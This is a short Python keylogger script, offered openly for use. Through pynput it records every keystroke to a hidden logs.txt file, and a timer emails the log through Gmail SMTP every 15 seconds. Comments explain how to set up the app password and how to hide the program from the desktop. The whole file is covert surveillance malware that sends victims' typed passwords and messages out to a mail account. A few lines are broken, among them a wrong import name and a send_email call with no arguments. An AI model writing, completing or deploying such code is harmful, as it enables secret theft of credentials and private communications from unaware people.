from pynput.keyboard import key , Listener
from smtplib import SMTP
from threading import Timer 
from time import sleep
import time 
import os 
sleep(1.0)
#to hide the application from desktop and still work in back ground 
#os.system("attrib +h keylogger.exe")
def key_pressed(key):
    try:
        press = str(key.char)

    except:
        if key == key.space :
            press = " "

        else:
            press = str (key)

    f= open("logs.txt","a")
    f.write(press)
    f.close()
    os.system("attrib +h logs.txt")


def send_email(email,password,msg):
    mailer = SMTP("smtp.gmail.com",587)
    mailer.starttls()
    mailer.login(email,password)
    mailer.sendmail(email,email,msg)#will send the logs text from the same e mail to the same email instet of making 2 e mails 
    mailer.quit()
#make a gmail account then go to >> security >> App password >> select app >> other custome name " text python" >> copy password
#put the password that u get in the parameters

def timer():#every 15 sec will send you the file 
    t = Timer(15,timer)
    t.start()
    try:

        f = open("logs.txt","r")#to open the logs files then read it
        logs = f.read ()
        send_email()#write here your e mail password that u get from google  ex) send_mail("veryImportant@gmail.com","password", logs) dont forget double qoutation
    except:
        nothing = ""



with Listener(on_press=key_pressed) as l : 
    #send mail method only be called one time already called before 
    timer()
    l.join()


